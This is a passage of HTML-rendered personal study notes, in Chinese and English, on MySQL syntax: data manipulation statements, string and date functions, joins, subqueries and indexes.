class="line">[&#123;, &lt;column_name&gt;=&#123;value_list&gt; | <span class="keyword">DEFAULT</span>&#125;&#125;...]</span><br></pre></td></tr></table></figure></p><p>REPLACE Statement<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">REPLACE</span> [<span class="keyword">LOW_PRIORITY</span> | <span class="keyword">DELAYED</span>] [<span class="keyword">IGNORE</span>] [<span class="keyword">INTO</span>] &#123;&lt;values_option&gt; | &lt;set_option&gt;&#125;;</span><br></pre></td></tr></table></figure></p><h4 id="Updating-Data"><a href="#Updating-Data" class="headerlink" title="Updating Data"></a>Updating Data</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> [<span class="keyword">LOW_PRIORITY</span> | <span class="keyword">DELAYED</span>] [<span class="keyword">IGNORE</span>] [<span class="keyword">INTO</span>] &lt;table_name&gt; </span><br><span class="line"><span class="keyword">SET</span> &lt;column_name&gt;=&lt;expression&gt; [&#123;, &lt;column_name&gt;=&lt;expression&gt;&#125; ...] [<span class="keyword">WHERE</span> &lt;condition&gt;];</span><br></pre></td></tr></table></figure><h4 id="Copying-Data"><a href="#Copying-Data" class="headerlink" title="Copying Data"></a>Copying Data</h4><p>SELECT statement<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *|&lt;column_name&gt; [&#123;,&lt;column_name&gt;&#125;...] <span class="keyword">FROM</span> &lt;table_name&gt;;</span><br></pre></td></tr></table></figure></p><p>Copying data to an existing table<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> &lt;table_name&gt;</span><br><span class="line"><span class="keyword">SELECT</span> *|&lt;column_name&gt; [&#123;,&lt;column_name&gt;&#125;...] <span class="keyword">FROM</span> &lt;table_name&gt;;</span><br><span class="line">or</span><br><span class="line"><span class="keyword">REPLACE</span> <span class="keyword">INTO</span> &lt;table_name&gt;</span><br><span class="line"><span class="keyword">SELECT</span> *|&lt;column_name&gt; [&#123;,&lt;column_name&gt;&#125;...] <span class="keyword">FROM</span> &lt;table_name&gt;;</span><br></pre></td></tr></table></figure></p><p>Copying data to a new table<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> &lt;table_name&gt; (</span><br><span class="line">&lt;column_definition&gt;[&#123;, &lt;column_definition&gt;&#125;...]</span><br><span class="line">) <span class="keyword">SELECT</span> *|&lt;column_name&gt; [&#123;,&lt;column_name&gt;&#125;...] <span class="keyword">FROM</span> &lt;table_name&gt;;</span><br></pre></td></tr></table></figure></p><h4 id="Deleting-Data"><a href="#Deleting-Data" class="headerlink" title="Deleting Data"></a>Deleting Data</h4><p>DELETE statement<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> [<span class="keyword">LOW_PRIORITY</span>] [<span class="keyword">IGNORE</span>] <span class="keyword">FROM</span> &lt;table_name&gt; [<span class="keyword">WHERE</span> &lt;condition&gt;];</span><br></pre></td></tr></table></figure></p><p>TRUNCATE statement<br>删除所有记录，相当于把表删除重建<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TRUNCATE</span> [TALBE] &lt;table_name&gt;;</span><br></pre></td></tr></table></figure></p><h4 id="Removing-a-Table"><a href="#Removing-a-Table" class="headerlink" title="Removing a Table"></a>Removing a Table</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> [<span class="keyword">TEMPORARY</span>] TALBE [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] [database_name].&lt;table_name&gt;[&#123;,&lt;table_name&gt;&#125;...]</span><br></pre></td></tr></table></figure><h4 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h4><p>long blob类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> commoditytable <span class="keyword">values</span>(<span class="string">'qiezibao'</span>, <span class="keyword">load_file</span>(<span class="string">'F:\\Code\\mysql\\a.jpg'</span>));</span><br></pre></td></tr></table></figure><h2 id="Retrieving-Data-检索数据"><a href="#Retrieving-Data-检索数据" class="headerlink" title="Retrieving Data 检索数据"></a>Retrieving Data 检索数据</h2><h3 id="Retrieving-Specific-Attributes"><a href="#Retrieving-Specific-Attributes" class="headerlink" title="Retrieving Specific Attributes"></a>Retrieving Specific Attributes</h3><p>SELECT statement<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [ALL|<span class="keyword">DISTINCT</span>] select_expr[<span class="keyword">as</span> new_name] [, select_expr...]</span><br><span class="line">    [<span class="keyword">FROM</span> table_reference] [<span class="keyword">WHERE</span> where_condition]</span><br></pre></td></tr></table></figure></p><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OR(||)</span><br><span class="line">AND(&amp;&amp;)</span><br><span class="line">NOT(!)</span><br></pre></td></tr></table></figure><h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">=</span><br><span class="line">&gt;=</span><br><span class="line">&lt;=</span><br><span class="line">&lt;&gt;, !=</span><br><span class="line">BETWEEN</span><br><span class="line">LIKE 类似于正则匹配(% is used to match any number of characters, _ is used to match a single characters) Eg. LIKE '_F%'</span><br><span class="line">IN 在一个集合中 Eg. IN ('001', '002')</span><br></pre></td></tr></table></figure><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DIV (整除)</span><br><span class="line">/ (除法)</span><br><span class="line">-</span><br><span class="line">%, MOD</span><br><span class="line">+</span><br><span class="line">*</span><br></pre></td></tr></table></figure><h4 id="用LIMIT约束"><a href="#用LIMIT约束" class="headerlink" title="用LIMIT约束"></a>用LIMIT约束</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LIMIT [offset, ] row_count</span><br><span class="line">offset 跳过计数的行数</span><br></pre></td></tr></table></figure><h3 id="用函数Customize查询结果"><a href="#用函数Customize查询结果" class="headerlink" title="用函数Customize查询结果"></a>用函数Customize查询结果</h3><h4 id="String-Functions"><a href="#String-Functions" class="headerlink" title="String Functions"></a>String Functions</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ASCII</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">ASCII</span>(<span class="string">'ABC'</span>); return 65</span><br><span class="line"></span><br><span class="line">LEFT</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="string">'DAVID'</span>, <span class="number">4</span>); return 'DAVI'</span><br><span class="line"></span><br><span class="line">REVERSE</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">REVERSE</span>(<span class="string">'ABC'</span>); return 'CBA'</span><br><span class="line"></span><br><span class="line">RIGHT</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(<span class="string">'LAWSON'</span>, <span class="number">4</span>); return 'WSON'</span><br><span class="line"></span><br><span class="line">SUBSTRING</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">SUBSTRING</span>(<span class="string">'Whether'</span>, <span class="number">2</span>, <span class="number">2</span>); return 'he'</span><br><span class="line"></span><br><span class="line">UPPER</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">UPPER</span>(<span class="string">'lawson'</span>); return 'LAWSON'</span><br><span class="line"></span><br><span class="line">LOWER</span><br><span class="line"><span class="keyword">SELECT</span> LOWRT(<span class="string">'RICHARD'</span>); return 'richard'</span><br><span class="line"></span><br><span class="line">CONCAT</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'Mary'</span>, <span class="string">' '</span>, <span class="string">'Smith'</span>); return 'Mary Smith'</span><br><span class="line"></span><br><span class="line">REGEXP</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">'John Peter'</span> REGEXP <span class="string">'peter'</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">. matches a single character</span><br><span class="line">p* matches zero or any number of occurrences of the p character</span><br><span class="line">p+ matches one or any number of occurrences of the p character</span><br><span class="line">p? matches zero or one occurrence of the p character</span><br><span class="line">^p matches the string(s) that begins <span class="keyword">with</span> a p <span class="built_in">character</span></span><br><span class="line">p$ matches the <span class="keyword">string</span>(s) that ends <span class="keyword">with</span> a p <span class="built_in">character</span></span><br><span class="line">pqr|abc matches the <span class="keyword">string</span>(s) <span class="keyword">having</span> either the <span class="keyword">sequence</span> <span class="keyword">of</span> pqr <span class="keyword">or</span> abc</span><br><span class="line">[pqrs] matches a single <span class="built_in">character</span> <span class="keyword">from</span> the <span class="keyword">characters</span> contained <span class="keyword">in</span> <span class="string">'['</span> <span class="keyword">and</span> <span class="string">']'</span></span><br><span class="line">[^pqrs] matches a single <span class="built_in">character</span> that <span class="keyword">is</span> <span class="keyword">not</span> contained <span class="keyword">in</span> <span class="string">'['</span> <span class="keyword">and</span> <span class="string">']'</span></span><br><span class="line">[p-s] matches <span class="keyword">any</span> <span class="built_in">character</span> <span class="keyword">from</span> p <span class="keyword">to</span> s</span><br><span class="line">[^p-s] matches <span class="keyword">any</span> <span class="built_in">character</span> <span class="keyword">except</span> the <span class="keyword">characters</span> <span class="keyword">from</span> p <span class="keyword">to</span> s</span><br></pre></td></tr></table></figure><h4 id="Date-Functions"><a href="#Date-Functions" class="headerlink" title="Date Functions"></a>Date Functions</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ADDDATE</span><br><span class="line"><span class="keyword">SELECT</span> ADDDATE(<span class="string">'2008-8-24 15:25:52'</span>, <span class="built_in">INTERVAL</span> <span class="string">'8:20'</span> HOUR_MINUTE); return '2008-08-24 23:45:52'</span><br><span class="line">DATE</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">DATE</span>(<span class="string">'2008-8-24 15:25:52'</span>); return '2008-08-24'</span><br><span class="line">MONTH</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MONTH</span>(<span class="string">'2008-8-24 15:25:52'</span>); return 8</span><br><span class="line">MONTHNAME</span><br><span class="line"><span class="keyword">SELECT</span> MONTHNAME(<span class="string">'2008-8-24 15:25:52'</span>); return 'August'</span><br><span class="line">YEAR</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">YEAR</span>(<span class="string">'2008-8-24 15:25:52'</span>); return 2008</span><br><span class="line">DATEDIFF</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DATEDIFF</span>(<span class="string">'2008-8-24 15:25:52'</span>, <span class="string">'2008-9-4 18:20:00'</span>); return -11</span><br><span class="line"></span><br><span class="line">TIMEDIFF</span><br><span class="line">DAY</span><br><span class="line">EXTRACT</span><br><span class="line">DATE_FORMAT</span><br></pre></td></tr></table></figure><p>expr<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HOUR 小时</span><br><span class="line">MINUTE 分</span><br><span class="line">SECOND 秒</span><br><span class="line">MICROSECOND 毫秒</span><br><span class="line">YEAR 年</span><br><span class="line">MONTH 月</span><br><span class="line">DAY 日</span><br><span class="line">WEEK 周</span><br><span class="line">QUARTER 季</span><br><span class="line">YEAR_MONTH 年和月</span><br><span class="line">DAY_HOUR 日和小时</span><br><span class="line">DAY_MINUTE 日和分钟</span><br><span class="line">DAY_ SECOND 日和秒</span><br><span class="line">HOUR_MINUTE 小时和分</span><br><span class="line">HOUR_SECOND 小时和秒</span><br><span class="line">MINUTE_SECOND 分钟和秒</span><br></pre></td></tr></table></figure></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%a name of weekday in an abbreviate</span><br><span class="line">%b name of month in an abbreviate</span><br><span class="line">%c month in numeric form</span><br><span class="line">%H hour in numeric form</span><br><span class="line">%i minutes in numeric form</span><br><span class="line">%j day of year in numeric form</span><br><span class="line">%M name of month</span><br><span class="line">%p time in am or pm</span><br><span class="line">%S second</span><br></pre></td></tr></table></figure><h4 id="Mathematical-Functions"><a href="#Mathematical-Functions" class="headerlink" title="Mathematical Functions"></a>Mathematical Functions</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FLOOR</span><br><span class="line">COT return cotangent of the specified angle in radians</span><br><span class="line">PI</span><br><span class="line">POW</span><br><span class="line">ROUND (numeric_expression, length) <span class="keyword">SELECT</span> <span class="keyword">ROUND</span>(<span class="number">12.789</span>, <span class="number">2</span>); return 12.79</span><br><span class="line">SQRT</span><br></pre></td></tr></table></figure><h4 id="Information-Functions"><a href="#Information-Functions" class="headerlink" title="Information Functions"></a>Information Functions</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">current_user()</span><br><span class="line">connection_id()</span><br><span class="line">database()</span><br><span class="line">version()</span><br><span class="line">charset() return character <span class="keyword">set</span> <span class="keyword">of</span> the <span class="keyword">string</span> argument</span><br></pre></td></tr></table></figure><h4 id="Cast-Functions"><a href="#Cast-Functions" class="headerlink" title="Cast Functions"></a>Cast Functions</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BINARY() <span class="comment"># 大小写敏感</span></span><br><span class="line">CAST() <span class="comment"># CAST(expr AS type)</span></span><br><span class="line">CONVERT() <span class="comment"># CONVERT(expr, type)</span></span><br></pre></td></tr></table></figure><h4 id="Aggregate-Functions"><a href="#Aggregate-Functions" class="headerlink" title="Aggregate Functions"></a>Aggregate Functions</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">avg</span><br><span class="line">sum</span><br><span class="line">min</span><br><span class="line">max</span><br><span class="line">count</span><br></pre></td></tr></table></figure><h3 id="Sorting-and-Grouping-Data"><a href="#Sorting-and-Grouping-Data" class="headerlink" title="Sorting and Grouping Data"></a>Sorting and Grouping Data</h3><h4 id="Sorting-Data"><a href="#Sorting-Data" class="headerlink" title="Sorting Data"></a>Sorting Data</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    [ALL | <span class="keyword">DISTINCT</span>]</span><br><span class="line">    select_expr [, select_expr ...]</span><br><span class="line">    [<span class="keyword">FROM</span> table_reference]</span><br><span class="line">    [<span class="keyword">WHERE</span> where_condition]</span><br><span class="line">    [<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name]</span><br><span class="line">    [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>]</span><br></pre></td></tr></table></figure><h4 id="Grouping-Data"><a href="#Grouping-Data" class="headerlink" title="Grouping Data"></a>Grouping Data</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    [ALL | <span class="keyword">DISTINCT</span>]</span><br><span class="line">    select_expr [, select_expr ...]</span><br><span class="line">    [<span class="keyword">FROM</span> table_reference]</span><br><span class="line">    [<span class="keyword">WHERE</span> where_condition]</span><br><span class="line">    [<span class="keyword">GROUP</span> <span class="keyword">BY</span> &#123;column_name | expr&#125;]</span><br><span class="line">    [<span class="keyword">HAVING</span> where_condition]</span><br></pre></td></tr></table></figure><h2 id="Join和Subqueries"><a href="#Join和Subqueries" class="headerlink" title="Join和Subqueries"></a>Join和Subqueries</h2><h3 id="Join"><a href="#Join" class="headerlink" title="Join"></a>Join</h3><p>一张图片搞定<br><img src="/img/note-mysql/joinimg.jpg" alt></p><h4 id="Inner-Join"><a href="#Inner-Join" class="headerlink" title="Inner Join"></a>Inner Join</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name, column_name, [, column_name]</span><br><span class="line"><span class="keyword">FROM</span> table1_name <span class="keyword">JOIN</span> table2_name</span><br><span class="line"><span class="keyword">ON</span> table1_name.ref_column_name join_operator </span><br><span class="line">table2_name.ref_column_name | <span class="keyword">USING</span> (ref_column_name)</span><br><span class="line">[<span class="keyword">WHERE</span> search_condition]</span><br></pre></td></tr></table></figure><p>ON 和 USING 二选一，USING可以合并相同的列</p><h4 id="Outer-Join"><a href="#Outer-Join" class="headerlink" title="Outer Join"></a>Outer Join</h4><p>LEFT OUTER JOIN<br>RIGHT OUTER JOIN<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name, column_name, [, column_name]</span><br><span class="line"><span class="keyword">FROM</span> table1_name [<span class="keyword">LEFT</span> | <span class="keyword">RIGHT</span>] <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> table2_name</span><br><span class="line"><span class="keyword">ON</span> table1_name.ref_column_name join_operator </span><br><span class="line">table2_name.ref_column_name | <span class="keyword">USING</span> (ref_column_name)</span><br><span class="line">[<span class="keyword">WHERE</span> search_condition]</span><br></pre></td></tr></table></figure></p><h4 id="Natural-Join"><a href="#Natural-Join" class="headerlink" title="Natural Join"></a>Natural Join</h4><p>根据公共列连接两个表<br>A natural join clubs columns from one table with the columns of another table on the basis of a common column<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name, column_name, [, column_name]</span><br><span class="line"><span class="keyword">FROM</span> &lt;table_reference&gt; <span class="keyword">NATURAL</span> [&#123;<span class="keyword">LEFT</span>| <span class="keyword">RIGHT</span>&#125; [<span class="keyword">OUTER</span>]] <span class="keyword">JOIN</span> &lt;table_reference&gt;</span><br></pre></td></tr></table></figure></p><h4 id="Cross-Join"><a href="#Cross-Join" class="headerlink" title="Cross Join"></a>Cross Join</h4><p>A cross join is used to join each row of one table with each row of another table.<br>就是乘法<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name, column_name, [, column_name]</span><br><span class="line"><span class="keyword">FROM</span> &lt;table_reference&gt; <span class="keyword">CROSS</span> <span class="keyword">JOIN</span> &lt;table_reference&gt;</span><br></pre></td></tr></table></figure></p><h4 id="Self-Join"><a href="#Self-Join" class="headerlink" title="Self Join"></a>Self Join</h4><p>Compare the value of one column with that of another in the same table<br>In a self join a table is joined to itself. As a result, one row in a table correlates with other rows in the same table.<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1 T1, table1 T2</span><br><span class="line"><span class="keyword">WHERE</span> condition;</span><br></pre></td></tr></table></figure></p><h3 id="Subqueries"><a href="#Subqueries" class="headerlink" title="Subqueries"></a>Subqueries</h3><h4 id="IN"><a href="#IN" class="headerlink" title="IN"></a>IN</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span>, <span class="keyword">column</span> [, <span class="keyword">column</span>]</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">column</span> <span class="keyword">IN</span> | <span class="keyword">NOT</span> <span class="keyword">IN</span></span><br><span class="line">    ( <span class="keyword">SELECT</span> <span class="keyword">column</span> <span class="keyword">FROM</span> table_name [ <span class="keyword">WHERE</span> where_condition] )</span><br></pre></td></tr></table></figure><h4 id="EXISTS"><a href="#EXISTS" class="headerlink" title="EXISTS"></a>EXISTS</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span>, <span class="keyword">column</span> [, <span class="keyword">column</span>]</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">column</span> <span class="keyword">EXISTS</span> | <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">    ( <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> table_name [ <span class="keyword">WHERE</span> where_condition] )</span><br></pre></td></tr></table></figure><blockquote><p>1、exists是对外表做loop循环，每次loop循环再对内表（子查询）进行查询，那么因为对内表的查询使用的索引（内表效率高，故可用大表），而外表有多大都需要遍历，不可避免（尽量用小表），故内表大的使用exists，可加快效率；<br>2、in是把外表和内表做hash连接，先查询内表，再把内表结果与外表匹配，对外表使用索引（外表效率高，可用大表），而内表多大都需要查询，不可避免，故外表大的使用in，可加快效率。<br>3、如果用not in ，则是内外表都全表扫描，无索引，效率低，可考虑使用not exists，也可使用A left join B on A.id=B.id where B.id is null 进行优化。</p></blockquote><h3 id="Using-Modified-Comparison-Operators"><a href="#Using-Modified-Comparison-Operators" class="headerlink" title="Using Modified Comparison Operators"></a>Using Modified Comparison Operators</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span>, <span class="keyword">column</span> [, <span class="keyword">column</span>]</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">column</span> &gt; | &lt; | = ALL | <span class="keyword">ANY</span></span><br><span class="line">    ( <span class="keyword">SELECT</span> <span class="keyword">column</span> <span class="keyword">FROM</span> table_name [ <span class="keyword">WHERE</span> where_condition] )</span><br></pre></td></tr></table></figure><p>The ALL keyword returns a TRUE value if the comparison performed is true for all the values that are retrieved by the subquery. It return FALSE if only some of the values satisfy the comparison operator or if the subquery does not return any rows to the outer statement<br>The ANY keyword returns a TRUE value if any value retrieved by the subquery satisfies the comparison operator. It returns a FALSE value if no values in the subquery satisifies the comparison operator or if the subquery does not return any row that matches the outer statement.</p><h3 id="Using-Nested-Subqueries"><a href="#Using-Nested-Subqueries" class="headerlink" title="Using Nested Subqueries"></a>Using Nested Subqueries</h3><p>You may need to use one or more subqueries within another subquery, known as a nested subquery. In the nested subquery, the condition specified in a subquery depends on the result of another subquery, which, in turns depends on the result of some another subquery.</p><h3 id="Using-Correlated-Subquery"><a href="#Using-Correlated-Subquery" class="headerlink" title="Using Correlated Subquery"></a>Using Correlated Subquery</h3><p>相关子查询</p><blockquote><p>1.扫描外查询的第一条记录<br>2.扫描子查询，并将第一条记录的对应值传给子查询，由此计算出子查询的结果<br>3.根据子查询的结果，返回外查询的结果。<br>4.重复上述动作，开始扫描外查询的第二条记录，第三条记录，直至全部扫描完毕</p></blockquote><p>You may want to use an inner query that depends on the outer query for its execution.<br>In a normal nested subquery, the inner query executes only once. The main query is executed by using the value returned by the inner query.<br>On the other hand, in a correlated subquery, the inner query is driven by the outer query. In this case, the inner query executes once for each row seleted by the outer query.</p><h2 id="Implementing-Indexes-and-Views"><a href="#Implementing-Indexes-and-Views" class="headerlink" title="Implementing Indexes and Views"></a>Implementing Indexes and Views</h2><h3 id="Creating-and-Managing-Indexes"><a href="#Creating-and-Managing-Indexes" class="headerlink" title="Creating and Managing Indexes"></a>Creating and Managing Indexes</h3><h4 id="Identifying-the-Types-of-Indexes"><a href="#Identifying-the-Types-of-Indexes" class="headerlink" title="Identifying the Types of Indexes"></a>Identifying the Types of Indexes</h4><p>MySQL allows you to create indexes on the tables to speed up data access. Indexes should be created on the columns that are most frequently included in the conditions, such as the columns included in the <code>WHERE</code> or <code>HAVING</code> clauses of <code>SELECT</code> statements. Therefore, you can create appropriate indexes on the required columns to improve the response time of the MySQL server.</p><p>MySQL supports the following types of indexes:</p><ul><li>Primary key</li><li>Foreign key</li><li>Unique</li><li>Regular</li><li>Full-text</li></ul><blockquote><p>Full-text index is defined on the column(s) that can accept string values. The purpose of this index is to improve the speed of the searches made on the string values included in the column data. The data type of the column(s) on which the full-text index can be defined can be <code>CHAR, VARCHAR, or TEXT</code>. Moreover, these column(s) can accept deplicate or NULL values.<br>The full-text indexes can be defined only on the tables that are accessed by using the MyISAM storage engine.</p></blockquote><h4 id="Creating-Indexes"><a href="#Creating-Indexes" class="headerlink" title="Creating Indexes"></a>Creating Indexes</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> &lt;table_name&gt; (</span><br><span class="line">...</span><br><span class="line">&#123;<span class="keyword">INDEX</span> | <span class="keyword">KEY</span>&#125; [&lt;index_name&gt;] (&lt;column_name&gt; [&#123;, &lt;column_name&gt;&#125;...])</span><br><span class="line">FULLTEXT &#123;<span class="keyword">INDEX</span> | <span class="keyword">KEY</span>&#125; [&lt;index_name&gt;] (&lt;column_name&gt; [&#123;, &lt;column_name&gt;&#125;...])</span><br><span class="line">)</span><br><span 